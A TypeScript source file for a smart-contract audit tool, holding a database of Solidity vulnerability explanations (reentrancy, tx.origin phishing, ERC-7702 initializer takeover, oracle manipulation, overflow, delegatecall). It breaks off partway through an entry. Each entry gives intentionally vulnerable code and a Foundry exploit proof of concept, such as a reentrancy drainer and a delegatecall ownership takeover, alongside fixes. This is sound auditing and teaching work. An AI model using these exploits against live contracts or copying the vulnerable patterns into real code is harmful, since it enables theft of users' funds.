/**
 * Explain Finding Tool
 *
 * Takes a vulnerability finding (by SWC ID, detector ID, or free-text title)
 * and returns a detailed explanation with:
 * - Root cause analysis
 * - Step-by-step exploit scenario
 * - Foundry PoC template
 * - Remediation code
 * - References
 */

import { z } from "zod";
import { Severity } from "../types/index.js";
import { logger } from "../utils/logger.js";

// ============================================================================
// Types
// ============================================================================

export const ExplainFindingInputSchema = z.object({
  findingId: z
    .string()
    .describe(
      "Finding ID to explain: SWC ID (e.g. 'SWC-107'), custom detector ID (e.g. 'CUSTOM-018'), " +
        "or free-text title (e.g. 'reentrancy', 'flash loan')"
    ),
  severity: z
    .enum(["critical", "high", "medium", "low", "informational"])
    .optional()
    .describe("Severity level for context (optional)"),
  contractContext: z
    .string()
    .optional()
    .describe("Brief description of the contract to tailor the explanation"),
});

export type ExplainFindingInput = z.infer<typeof ExplainFindingInputSchema>;

interface FindingExplanation {
  id: string;
  title: string;
  severity: Severity;
  rootCause: string;
  impactDescription: string;
  exploitScenario: string[];
  vulnerableCode: string;
  secureCode: string;
  pocTemplate: string;
  remediation: string[];
  references: string[];
}

// ============================================================================
// Finding Knowledge Base
// ============================================================================

const FINDING_DATABASE: Record<string, FindingExplanation> = {
  "SWC-107": {
    id: "SWC-107",
    title: "Reentrancy",
    severity: Severity.CRITICAL,
    rootCause:
      "The contract makes an external call to an untrusted address before updating its own state. " +
      "The called contract can re-enter the vulnerable function and exploit the stale state.",
    impactDescription:
      "An attacker can drain all ETH or tokens from the contract by recursively calling " +
      "the withdraw function before the balance is updated.",
    exploitScenario: [
      "1. Attacker deploys a malicious contract with a receive() or fallback() function",
      "2. Attacker calls victim.withdraw(1 ETH) from the malicious contract",
      "3. Victim sends 1 ETH to attacker (before updating balance)",
      "4. Attacker's receive() re-enters victim.withdraw(1 ETH)",
      "5. Balance is still non-zero (not yet updated), so withdrawal succeeds again",
      "6. Steps 4-5 repeat until the victim contract is drained",
    ],
    vulnerableCode: `// VULNERABLE: external call before state update
function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount);
    // ❌ External call BEFORE state update
    (bool success,) = msg.sender.call{value: amount}("");
    require(success);
    balances[msg.sender] -= amount; // Too late!
}`,
    secureCode: `// SECURE: Checks-Effects-Interactions + ReentrancyGuard
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

function withdraw(uint256 amount) external nonReentrant {
    require(balances[msg.sender] >= amount, "Insufficient balance");
    // ✅ Update state BEFORE external call (CEI pattern)
    balances[msg.sender] -= amount;
    (bool success,) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}`,
    pocTemplate: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerableContract} from "src/VulnerableContract.sol";

contract ReentrancyAttacker {
    VulnerableContract public target;
    uint256 public attackCount;

    constructor(address _target) {
        target = VulnerableContract(_target);
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (attackCount < 5 && address(target).balance >= msg.value) {
            attackCount++;
            target.withdraw(msg.value);
        }
    }
}

contract ReentrancyTest is Test {
    VulnerableContract public target;
    ReentrancyAttacker public attacker;

    function setUp() public {
        target = new VulnerableContract();
        attacker = new ReentrancyAttacker(address(target));
        // Seed victim with ETH from other users
        address alice = makeAddr("alice");
        vm.deal(alice, 10 ether);
        vm.prank(alice);
        target.deposit{value: 10 ether}();
    }

    function test_reentrancyDrain() public {
        vm.deal(address(attacker), 1 ether);
        uint256 balanceBefore = address(attacker).balance;
        attacker.attack{value: 1 ether}();
        uint256 balanceAfter = address(attacker).balance;
        assertGt(balanceAfter, balanceBefore, "Attack should profit");
        emit log_named_uint("Profit (ETH)", (balanceAfter - balanceBefore) / 1e18);
    }
}`,
    remediation: [
      "Apply the Checks-Effects-Interactions (CEI) pattern: validate, update state, then call external",
      "Add OpenZeppelin's ReentrancyGuard modifier (nonReentrant) to all state-modifying functions",
      "Consider using a pull payment pattern instead of push (let users withdraw themselves)",
      "If using transient storage as a reentrancy guard, ensure it's not cleared by delegatecall",
    ],
    references: [
      "https://swcregistry.io/docs/SWC-107",
      "https://docs.openzeppelin.com/contracts/api/security#ReentrancyGuard",
      "https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/",
    ],
  },

  "SWC-115": {
    id: "SWC-115",
    title: "Authorization Through tx.origin",
    severity: Severity.HIGH,
    rootCause:
      "tx.origin returns the original EOA that initiated the transaction chain, not the immediate caller. " +
      "When a victim interacts with an attacker's contract, the attacker's contract can call the victim " +
      "contract and tx.origin will be the victim's address — passing the authorization check.",
    impactDescription:
      "An attacker can trick a victim into calling a malicious contract, which then calls the vulnerable " +
      "contract on the victim's behalf, bypassing tx.origin-based authorization.",
    exploitScenario: [
      "1. Vulnerable contract uses require(tx.origin == owner) for authorization",
      "2. Attacker deploys a phishing contract that calls vulnerable.drain() in its receive()",
      "3. Attacker tricks the owner into sending ETH to the phishing contract",
      "4. tx.origin is the owner's address, authorization passes",
      "5. Phishing contract drains the vulnerable contract",
    ],
    vulnerableCode: `// VULNERABLE
function emergencyWithdraw() external {
    // ❌ tx.origin can be the victim of a phishing attack
    require(tx.origin == owner, "Not owner");
    payable(owner).transfer(address(this).balance);
}`,
    secureCode: `// SECURE
function emergencyWithdraw() external {
    // ✅ Use msg.sender for immediate caller verification
    require(msg.sender == owner, "Not owner");
    payable(owner).transfer(address(this).balance);
}`,
    pocTemplate: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerableContract} from "src/VulnerableContract.sol";

contract PhishingContract {
    VulnerableContract public target;

    constructor(address _target) {
        target = VulnerableContract(_target);
    }

    receive() external payable {
        // When owner sends ETH here, call drain on their behalf
        target.emergencyWithdraw();
    }
}

contract TxOriginTest is Test {
    VulnerableContract public target;
    PhishingContract public phishing;
    address owner = makeAddr("owner");

    function setUp() public {
        vm.prank(owner);
        target = new VulnerableContract();
        phishing = new PhishingContract(address(target));
        vm.deal(address(target), 10 ether);
    }

    function test_txOriginExploit() public {
        uint256 phishingBalBefore = address(phishing).balance;
        // Owner is tricked into sending ETH to phishing contract
        vm.prank(owner); // tx.origin = owner
        (bool sent,) = address(phishing).call{value: 0.001 ether}("");
        assertTrue(sent);
        // Phishing contract has drained target
        assertEq(address(target).balance, 0);
    }
}`,
    remediation: [
      "Replace tx.origin with msg.sender for all authorization checks",
      "If you need to distinguish EOA from contract caller, use msg.sender and check extcodesize(msg.sender) == 0",
      "Never use tx.origin for access control in any context",
    ],
    references: [
      "https://swcregistry.io/docs/SWC-115",
      "https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/tx-origin/",
    ],
  },

  "CUSTOM-018": {
    id: "CUSTOM-018",
    title: "ERC-7702 Unprotected Initializer After setCode",
    severity: Severity.CRITICAL,
    rootCause:
      "ERC-7702 allows EOAs to delegate their execution context to a smart contract via setCode. " +
      "If the delegated contract has an unguarded initialize() function, an attacker can call it " +
      "on a victim's EOA after delegation, taking ownership of the account.",
    impactDescription:
      "An attacker can gain full control over any EOA that has delegated to the vulnerable contract " +
      "by calling initialize() before the legitimate owner does, setting themselves as owner.",
    exploitScenario: [
      "1. Legitimate contract deployed with initialize() function guarded by initializer modifier",
      "2. Victim's EOA delegates to this contract via ERC-7702 setCode",
      "3. Attacker calls victim_eoa.initialize(attacker_address) in the same or next block",
      "4. If the initializer modifier is missing or bypassable, attacker becomes owner",
      "5. Attacker can now drain the EOA or use it for malicious purposes",
    ],
    vulnerableCode: `// VULNERABLE: initialize() without initializer guard
contract SmartWallet {
    address public owner;

    // ❌ No initializer guard — anyone can call this after ERC-7702 delegation
    function initialize(address _owner) external {
        owner = _owner;
    }
}`,
    secureCode: `// SECURE: Use OpenZeppelin Initializable
import "@openzeppelin/contracts/proxy/utils/Initializable.sol";

contract SmartWallet is Initializable {
    address public owner;

    // ✅ initializer modifier prevents re-initialization
    function initialize(address _owner) external initializer {
        owner = _owner;
    }

    // ✅ Disable initializers in implementation constructor
    constructor() {
        _disableInitializers();
    }

    // ✅ Also verify caller is the EOA itself for ERC-7702 contexts
    modifier onlySelf() {
        require(msg.sender == address(this), "Not self");
        _;
    }
}`,
    pocTemplate: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {SmartWallet} from "src/SmartWallet.sol";

contract ERC7702InitializerTest is Test {
    SmartWallet public impl;
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    function setUp() public {
        impl = new SmartWallet();
        // Simulate ERC-7702: victim EOA delegates to impl
        // In practice, this is done via a signed authorization tuple
        vm.etch(victim, address(impl).code);
    }

    function test_initializerTakeover() public {
        // Attacker calls initialize on victim's delegated account
        vm.prank(attacker);
        SmartWallet(victim).initialize(attacker);

        assertEq(SmartWallet(victim).owner(), attacker, "Attacker took ownership");
    }
}`,
    remediation: [
      "Use OpenZeppelin's Initializable with the initializer modifier on initialize()",
      "Call _disableInitializers() in the implementation constructor",
      "For ERC-7702, add require(msg.sender == address(this)) to restrict initialization to the delegating EOA",
      "Consider using reinitializer(version) for upgradeable contracts that need re-initialization",
    ],
    references: [
      "https://eips.ethereum.org/EIPS/eip-7702",
      "https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#initializing_the_implementation_contract",
    ],
  },

  "CUSTOM-004": {
    id: "CUSTOM-004",
    title: "Stale or Manipulable Price Oracle",
    severity: Severity.HIGH,
    rootCause:
      "The contract uses a spot price from a DEX reserve or an oracle without checking freshness. " +
      "An attacker can manipulate the spot price within a single transaction using a flash loan.",
    impactDescription:
      "An attacker can manipulate the price used for collateral valuation, borrowing limits, " +
      "or liquidation thresholds — allowing them to borrow more than allowed, avoid liquidation, " +
      "or trigger illegitimate liquidations.",
    exploitScenario: [
      "1. Attacker takes a flash loan of a large amount of tokenA",
      "2. Attacker swaps tokenA for tokenB in the DEX, manipulating the spot price",
      "3. Attacker calls the vulnerable contract which reads the manipulated spot price",
      "4. Using the inflated price, attacker borrows far more than their collateral is worth",
      "5. Attacker repays the flash loan and exits with the excess borrowed funds",
    ],
    vulnerableCode: `// VULNERABLE: spot price from DEX reserves
function getPrice() internal view returns (uint256) {
    // ❌ Spot price can be manipulated in a single block
    (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
    return uint256(reserve1) * 1e18 / uint256(reserve0);
}

function borrow(uint256 amount) external {
    uint256 price = getPrice(); // manipulable!
    uint256 collateralValue = deposits[msg.sender] * price;
    require(collateralValue >= amount * 150 / 100, "Undercollateralized");
    borrowed[msg.sender] += amount;
    token.transfer(msg.sender, amount);
}`,
    secureCode: `// SECURE: Chainlink with staleness check + TWAP
import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

AggregatorV3Interface public priceFeed;
uint256 public constant STALENESS_THRESHOLD = 3600; // 1 hour

function getPrice() internal view returns (uint256) {
    (
        uint80 roundId,
        int256 price,
        ,
        uint256 updatedAt,
        uint80 answeredInRound
    ) = priceFeed.latestRoundData();
    // ✅ Staleness check
    require(updatedAt >= block.timestamp - STALENESS_THRESHOLD, "Stale price");
    // ✅ Round completion check
    require(answeredInRound >= roundId, "Incomplete round");
    require(price > 0, "Invalid price");
    return uint256(price);
}`,
    pocTemplate: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {LendingPool} from "src/LendingPool.sol";

contract OracleManipulationTest is Test {
    LendingPool public lending;
    IUniswapV2Pair public pair;
    IERC20 public tokenA;
    IERC20 public tokenB;

    function test_flashLoanOracleManipulation() public {
        uint256 flashAmount = 1_000_000e18;
        uint256 borrowerCollateral = 100e18;

        // Attacker deposits collateral
        vm.startPrank(attacker);
        tokenB.approve(address(lending), borrowerCollateral);
        lending.deposit(borrowerCollateral);

        // At fair price, max borrow = 66 tokenA (150% collateral ratio)
        uint256 fairMaxBorrow = lending.maxBorrow(attacker);

        // Flash loan to manipulate price
        // ... (flash loan callback manipulates pair reserves)

        // After manipulation, borrow 10x more than allowed
        uint256 manipulatedMaxBorrow = lending.maxBorrow(attacker);
        assertGt(manipulatedMaxBorrow, fairMaxBorrow * 5, "Price manipulation successful");
        vm.stopPrank();
    }
}`,
    remediation: [
      "Use Chainlink price feeds with staleness checks (updatedAt >= block.timestamp - MAX_STALENESS)",
      "Validate round data: answeredInRound >= roundId and price > 0",
      "Use TWAP (time-weighted average price) instead of spot prices for DEX-based oracles",
      "For Uniswap V3, use OracleLibrary.consult() with a meaningful period (e.g., 30 minutes)",
      "Consider multi-oracle redundancy: require prices from 2+ sources to agree within a threshold",
    ],
    references: [
      "https://blog.openzeppelin.com/secure-smart-contract-guidelines-the-dangers-of-price-oracles",
      "https://samczsun.com/so-you-want-to-use-a-price-oracle/",
      "https://docs.chain.link/data-feeds/price-feeds",
    ],
  },

  // ─────────────────────────────────────────────────────────────────────────
  // SWC ENTRIES
  // ─────────────────────────────────────────────────────────────────────────

  "SWC-101": {
    id: "SWC-101",
    title: "Integer Overflow and Underflow",
    severity: Severity.HIGH,
    rootCause:
      "Solidity integers wrap around on overflow/underflow in versions before 0.8.0. " +
      "Adding to uint256.MAX gives 0; subtracting from 0 gives uint256.MAX. " +
      "Unchecked blocks in Solidity 0.8+ re-introduce this behaviour.",
    impactDescription:
      "An attacker can manipulate token balances, bypass require checks, or cause " +
      "accounting to drift — enabling theft of funds or protocol insolvency.",
    exploitScenario: [
      "1. Contract tracks balances in uint256 without SafeMath (pre-0.8) or unchecked block",
      "2. Attacker has balance of 0",
      "3. Attacker calls transfer(attacker, 1) — triggers underflow: 0 - 1 = type(uint256).max",
      "4. Attacker now has an astronomically large balance they can drain",
    ],
    vulnerableCode: `// VULNERABLE (Solidity < 0.8.0)
contract Token {
    mapping(address => uint256) public balances;

    function transfer(address to, uint256 amount) external {
        // ❌ No overflow/underflow check — balances[msg.sender] can wrap
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }
}

// ALSO VULNERABLE (Solidity >= 0.8.0 with unchecked block)
function unsafeAdd(uint256 a, uint256 b) internal pure returns (uint256) {
    unchecked { return a + b; } // ❌ Wraps silently
}`,
    secureCode: `// SECURE (Solidity >= 0.8.0 — built-in overflow checks)
contract Token {
    mapping(address => uint256) public balances;

    function transfer(address to, uint256 amount) external {
        // ✅ Reverts automatically on underflow (Solidity 0.8+)
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }
}

// For Solidity < 0.8.0: use OpenZeppelin SafeMath
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
using SafeMath for uint256;
balances[msg.sender] = balances[msg.sender].sub(amount);`,
    pocTemplate: `// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6; // intentionally pre-0.8

import {Test} from "forge-std/Test.sol";
import {VulnerableToken} from "src/VulnerableToken.sol";

contract OverflowTest is Test {
    VulnerableToken public token;
    address attacker = makeAddr("attacker");

    function setUp() public {
        token = new VulnerableToken();
        // Attacker starts with 0 balance
    }

    function test_underflowDrain() public {
        vm.prank(attacker);
        // Underflow: 0 - 1 = 2^256 - 1
        token.transfer(attacker, 1);

        assertEq(token.balances(attacker), type(uint256).max);
    }
}`,
    remediation: [
      "Upgrade to Solidity 0.8.x or later — overflow/underflow revert by default",
      "For pre-0.8 code, use OpenZeppelin SafeMath for all arithmetic",
      "Audit every unchecked { } block — only use it when overflow is provably impossible",
      "Add invariant tests that assert totalSupply == sum of all balances",
    ],
    references: [
      "https://swcregistry.io/docs/SWC-101",
      "https://docs.soliditylang.org/en/latest/control-structures.html#checked-or-unchecked-arithmetic",
      "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol",
    ],
  },

  "SWC-103": {
    id: "SWC-103",
    title: "Floating Pragma",
    severity: Severity.LOW,
    rootCause:
      "A floating pragma (^0.8.0 or >=0.8.0) allows the contract to be compiled with any " +
      "compatible version, including future ones that may introduce breaking changes or bugs. " +
      "Different environments may compile with different versions, leading to inconsistencies.",
    impactDescription:
      "Contracts compiled with an unintended Solidity version may exhibit different behaviour, " +
      "compiler bugs, or missing security features. This is especially dangerous for libraries " +
      "deployed across multiple chains.",
    exploitScenario: [
      "1. Contract deployed with pragma ^0.8.0 compiled locally with 0.8.20",
      "2. Audit done with 0.8.25 — different optimizer output, different warnings",
      "3. Solidity 0.9.0 releases with a breaking change in storage layout",
      "4. Redeployment silently uses 0.9.0 — storage reads return wrong values",
    ],
    vulnerableCode: `// VULNERABLE: floating pragma
pragma solidity ^0.8.0;  // ❌ any 0.8.x can compile this
// or
pragma solidity >=0.6.0 <0.9.0;  // ❌ even wider range`,
    secureCode: `// SECURE: locked pragma
pragma solidity 0.8.28;  // ✅ exact version, reproducible builds

// For libraries meant to be composed: document the tested range
// and lock in your own deployment scripts`,
    pocTemplate: `// This is a configuration/deployment issue rather than an on-chain exploit.
// Test by compiling with multiple versions and diffing bytecode:

// foundry.toml
// [profile.default]
// solc_version = "0.8.28"   # ✅ lock version here

// Verify with:
// forge build --force && shasum out/Contract.sol/Contract.json`,
    remediation: [
      "Lock the pragma to a specific, tested version: pragma solidity 0.8.28;",
      "Set solc_version in foundry.toml or solidity.version in hardhat.config",
      "Use the same compiler version across development, testing, and deployment",
      "For library packages, document minimum supported version and let consumers lock",
    ],
    references: [
      "https://swcregistry.io/docs/SWC-103",
      "https://docs.soliditylang.org/en/latest/layout-of-source-files.html#version-pragma",
    ],
  },

  "SWC-104": {
    id: "SWC-104",
    title: "Unchecked Return Value From External Call",
    severity: Severity.HIGH,
    rootCause:
      "Low-level calls (call, delegatecall, staticcall, send) return a boolean success flag. " +
      "If the return value is not checked, a failed call is silently ignored and execution continues " +
      "as if it succeeded.",
    impactDescription:
      "Failed token transfers or ETH sends may go undetected, causing accounting drift, " +
      "locked funds, or protocol insolvency. Attackers can exploit this to receive services " +
      "without actually transferring payment.",
    exploitScenario: [
      "1. Contract calls token.transfer(user, amount) without checking return value",
      "2. Token is non-standard (e.g. USDT) and returns false on failure instead of reverting",
      "3. Transfer silently fails — user receives the service but the contract records the payment",
      "4. Attacker can repeat indefinitely, draining the protocol",
    ],
    vulnerableCode: `// VULNERABLE: ignoring transfer return value
function withdraw(uint256 amount) external {
    balances[msg.sender] -= amount;
    // ❌ Return value ignored — silent failure possible
    token.transfer(msg.sender, amount);
}

// ALSO VULNERABLE: unchecked low-level call
function sendEth(address to, uint256 amount) internal {
    to.call{value: amount}(""); // ❌ success not checked
}`,
    secureCode: `// SECURE: use SafeERC20 for token transfers
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
using SafeERC20 for IERC20;

function withdraw(uint256 amount) external {
    balances[msg.sender] -= amount;
    // ✅ safeTransfer reverts on false return value
    token.safeTransfer(msg.sender, amount);
}

// SECURE: check low-level call result
function sendEth(address to, uint256 amount) internal {
    (bool success,) = to.call{value: amount}("");
    require(success, "ETH transfer failed");
}`,
    pocTemplate: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerableVault} from "src/VulnerableVault.sol";
import {ReturnFalseToken} from "test/mocks/ReturnFalseToken.sol";

contract UncheckedReturnTest is Test {
    VulnerableVault public vault;
    ReturnFalseToken public token; // always returns false on transfer

    function setUp() public {
        token = new ReturnFalseToken();
        vault = new VulnerableVault(address(token));
        token.mint(address(vault), 1000e18);
    }

    function test_silentTransferFailure() public {
        address user = makeAddr("user");
        vm.prank(user);
        // Vault credits withdrawal but token transfer silently fails
        vault.withdraw(100e18);
        // User balance is 0 — vault accounting is corrupted
        assertEq(token.balanceOf(user), 0);
    }
}`,
    remediation: [
      "Use OpenZeppelin's SafeERC20 (safeTransfer, safeTransferFrom) for all ERC20 operations",
      "Always capture and check the bool return value of .call{value:...}()",
      "Never use .send() or .transfer() — use .call{value:...}('') with success check",
      "Add integration tests with non-standard tokens (USDT, USDC) that return false",
    ],
    references: [
      "https://swcregistry.io/docs/SWC-104",
      "https://docs.openzeppelin.com/contracts/api/token/erc20#SafeERC20",
    ],
  },

  "SWC-116": {
    id: "SWC-116",
    title: "Block Timestamp Dependence",
    severity: Severity.MEDIUM,
    rootCause:
      "block.timestamp is set by the block proposer (miner/validator) and can be manipulated " +
      "within a window of approximately 15 seconds (Ethereum) or more on some L2s. " +
      "Using it for critical logic like randomness, deadlines, or lock periods opens manipulation vectors.",
    impactDescription:
      "A validator can manipulate block.timestamp to trigger or prevent time-sensitive conditions: " +
      "winning a lottery, avoiding a liquidation deadline, front-running a vesting unlock, or " +
      "bypassing a cooldown period.",
    exploitScenario: [
      "1. Contract uses block.timestamp % 2 == 0 to determine lottery winner",
      "2. Malicious validator controls the next block and chooses a timestamp that is even",
      "3. Validator ensures their address wins the lottery",
      "4. On PoS Ethereum, slot proposers know 1 epoch in advance — plenty of time to plan",
    ],
    vulnerableCode: `// VULNERABLE: timestamp used for randomness / critical decisions
function claimLottery() external {
    // ❌ Validator controls block.timestamp within ~15s window
    require(block.timestamp % 2 == 0, "Wrong time");
    payable(msg.sender).transfer(address(this).balance);
}

// VULNERABLE: tight deadline that validator can nudge
function executeOrder(uint256 deadline) external {
    require(block.timestamp <= deadline, "Expired");
    // Validator can delay tx inclusion by 1 second to expire the order
}`,
    secureCode: `// SECURE: use Chainlink VRF for randomness — not timestamps
import "@chainlink/contracts/src/v0.8/vrf/VRFConsumerBaseV2.sol";

// SECURE: use a tolerance buffer for deadlines (e.g. 5–30 min)
function executeOrder(uint256 deadline) external {
    // ✅ Allow 5-minute validator tolerance
    require(block.timestamp <= deadline + 5 minutes, "Expired");
}

// SECURE: for vesting/lock, use a sufficiently long period
// where 15s manipulation is negligible
uint256 public constant LOCK_PERIOD = 30 days;
require(block.timestamp >= lockStart + LOCK_PERIOD, "Still locked");`,
    pocTemplate: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {TimeLottery} from "src/TimeLottery.sol";

contract TimestampManipulationTest is Test {
    TimeLottery public lottery;
    address attacker = makeAddr("attacker");

    function setUp() public {
        lottery = new TimeLottery();
        vm.deal(address(lottery), 10 ether);
    }

    function test_timestampManipulation() public {
        // Warp to an even timestamp (simulating validator control)
        vm.warp(block.timestamp % 2 == 0 ? block.timestamp : block.timestamp + 1);

        uint256 balBefore = address(attacker).balance;
        vm.prank(attacker);
        lottery.claimLottery();
        assertGt(address(attacker).balance, balBefore, "Won lottery via timestamp control");
    }
}`,
    remediation: [
      "Never use block.timestamp as a source of randomness — use Chainlink VRF",
      "For time-based locks use periods long enough that 15s manipulation is negligible (hours/days)",
      "Add tolerance buffers to tight deadlines (allow ±5 minutes for validator drift)",
      "On L2s (Optimism, Arbitrum) check sequencer-specific timestamp guarantees before relying on them",
    ],
    references: [
      "https://swcregistry.io/docs/SWC-116",
      "https://docs.chain.link/vrf",
      "https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/timestamp-dependence/",
    ],
  },

  "SWC-112": {
    id: "SWC-112",
    title: "Delegatecall to Untrusted Callee",
    severity: Severity.CRITICAL,
    rootCause:
      "delegatecall executes foreign code in the storage context of the calling contract. " +
      "If the callee address is user-controlled or not validated, an attacker can supply a " +
      "malicious contract that overwrites critical storage slots (e.g. owner, implementation).",
    impactDescription:
      "Complete takeover of the calling contract: the attacker can overwrite owner, pause flags, " +
      "or any storage variable, drain funds, or brick the contract permanently.",
    exploitScenario: [
      "1. Contract has a function that delegates to a user-supplied address",
      "2. Attacker deploys MaliciousImpl with selfdestruct or storage overwrite logic",
      "3. Attacker calls vulnerable.execute(maliciousImpl, payload)",
      "4. delegatecall runs MaliciousImpl.code in victim's storage context",
      "5. Attacker's contract sets owner = attacker, then drains all funds",
    ],
    vulnerableCode: `// VULNERABLE: user-controlled delegatecall target
function execute(address impl, bytes calldata data) external {
    // ❌ Any address can be passed — attacker controls execution context
    (bool success,) = impl.delegatecall(data);
    require(success);
}`,
    secureCode: `// SECURE: only delegate to whitelisted implementations
mapping(address => bool) public approvedImplementations;

function execute(address impl, bytes calldata data) external onlyOwner {
    // ✅ Only approved implementations
    require(approvedImplementations[impl], "Unapproved impl");
    (bool success,) = impl.delegatecall(data);
    require(success, "Delegatecall failed");
}

// SECURE PROXY: use ERC-1967 with protected upgrade path
// (OpenZeppelin TransparentUpgradeableProxy or UUPS)`,
    pocTemplate: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerableExecutor} from "src/VulnerableExecutor.sol";

contract MaliciousImpl {
    // Storage layout must match VulnerableExecutor
    address public owner; // slot 0

    function takeover(address attacker) external {
        owner = attacker;  // Overwrites victim's slot 0
    }
}

contract DelegatecallTest is Test {
    VulnerableExecutor public victim;
    MaliciousImpl public malicious;
    address attacker = makeAddr("attacker");

    function setUp() public {
        victim = new VulnerableExecutor();
        malicious = new MaliciousImpl();
    }

    function test_delegatecallTakeover() public {
        assertNotEq(victim.owner(), attacker);

        vm.prank(attacker);
        victim.execute(
            address(malicious),
            abi.encodeCall(MaliciousImpl.takeover, (attacker))
        );

        assertEq(victim.owner(), attacker, "Attacker took ownership");
    }
}`,
    remediation: [
      "Never delegatecall to user-supplied addresses",
      "Maintain an on-chain whitelist of approved implementation contracts",
      "Use OpenZeppelin's upgradeable proxy patterns (UUPS/Transparent) with protected upgrade functions",
      "If a library pattern is needed, use regular calls (call) or internal libraries instead",
      "Audit storage layouts carefully when upgrading proxy implementations",
    ],
    references: [
      "https://swcregistry.io/docs/SWC-112",
      "https://docs.openzeppelin.com/contracts/api/proxy",
      "https://eips.ethereum.org/EIPS/eip-1967",
    ],
  },

  // ─────────────────────────────────────────────────────────────────────────
  // CUSTOM ENTRIES
  // ─────────────────────────────────────────────────────────────────────────

  "CUSTOM-001": {
    id: "CUSTOM-001",
    title: "Array Length Mismatch",
    severity: Severity.HIGH,
    rootCause:
      "Functions that accept two or more arrays and assume equal length without an explicit " +
      "length check will process mismatched data when lengths differ. Solidity does not enforce " +
      "parameter array length consistency automatically.",
    impactDescription:
      "Silent data corruption: some recipients receive multiple payouts while others receive none. " +
      "In airdrop/batch transfer scenarios this leads to fund loss or unfair distribution. " +
      "In governance, mismatched vote arrays can corrupt proposal outcomes.",
    exploitScenario: [
      "1. Contract has batchTransfer(address[] recipients, uint256[] amounts) with no length check",
      "2. Attacker calls with recipients = [alice, attacker] and amounts = [0, 1000]",
      "3. Contract iterates amounts.length (2) but accesses recipients[i] normally",
      "4. If recipients is shorter, out-of-bounds revert (in 0.8) or wrong address (in <0.8)",
      "5. Or: attacker provides more amounts than recipients — some amounts processed without recipient",
    ],
    vulnerableCode: `// VULNERABLE: no length equality check
function batchTransfer(
    address[] calldata recipients,
    uint256[] calldata amounts
) external {
    // ❌ No require(recipients.length == amounts.length)
    for (uint256 i = 0; i < amounts.length; i++) {
        token.transfer(recipients[i], amounts[i]);
    }
}`,
    secureCode: `// SECURE: explicit length guard
function batchTransfer(
    address[] calldata recipients,
    uint256[] calldata amounts
) external {
    // ✅ Enforce equal lengths before processing
    require(
        recipients.length == amounts.length,
        "Array length mismatch"
    );
    require(recipients.length > 0, "Empty arrays");

    for (uint256 i = 0; i < recipients.length; i++) {
        require(recipients[i] != address(0), "Zero address recipient");
        token.safeTransfer(recipients[i], amounts[i]);
    }
}`,
    pocTemplate: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerableBatch} from "src/VulnerableBatch.sol";

contract ArrayMismatchTest is Test {
    VulnerableBatch public batch;

    function setUp() public {
        batch = new VulnerableBatch();
    }

    function test_mismatchedArrays() public {
        address[] memory recipients = new address[](1);
        recipients[0] = makeAddr("alice");

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 100e18;
        amounts[1] = 900e18; // This amount has no corresponding recipient

        // Should revert, but vulnerable version may not
        vm.expectRevert();
        batch.batchTransfer(recipients, amounts);
    }
}`,
    remediation: [
      "Add require(arr1.length == arr2.length, 'Length mismatch') at the start of every batch function",
      "Also check require(arr1.length > 0) to prevent empty-array calls that waste gas",
      "Consider using a struct array instead: Transfer[] calldata transfers — impossible to mismatch",
      "Add fuzz tests with random-length arrays to catch off-by-one errors",
    ],
    references: [
      "https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-equality",
      "https://consensys.github.io/smart-contract-best-practices/development-recommendations/general/input-validation/",
    ],
  },

  "CUSTOM-005": {
    id: "CUSTOM-005",
    title: "Missing Zero Address Validation",
    severity: Severity.MEDIUM,
    rootCause:
      "Solidity functions that accept address parameters do not automatically reject address(0). " +
      "If a critical address (owner, fee recipient, token address) is accidentally set to zero, " +
      "it can result in permanent loss of funds or locked admin access.",
    impactDescription:
      "Setting owner = address(0) permanently bricks admin functions. Setting fee recipient " +
      "to zero burns protocol revenue. Setting token = address(0) causes all token operations to " +
      "call the zero address (which succeeds vacuously, silently losing funds).",
    exploitScenario: [
      "1. Admin calls setOwner(address(0)) by mistake (copy-paste error)",
      "2. All onlyOwner functions are now permanently inaccessible",
      "3. No emergency withdrawal, no upgrade, no pause — protocol is bricked",
      "4. All protocol funds are permanently locked",
    ],
    vulnerableCode: `// VULNERABLE: no zero-address check
contract Vault {
    address public owner;
    address public feeRecipient;

    function setOwner(address newOwner) external onlyOwner {
        // ❌ address(0) accepted — permanently locks admin access
        owner = newOwner;
    }

    function setFeeRecipient(address recipient) external onlyOwner {
        // ❌ Fees would be burned if set to address(0)
        feeRecipient = recipient;
    }
}`,
    secureCode: `// SECURE: validate all address parameters
contract Vault {
    address public owner;
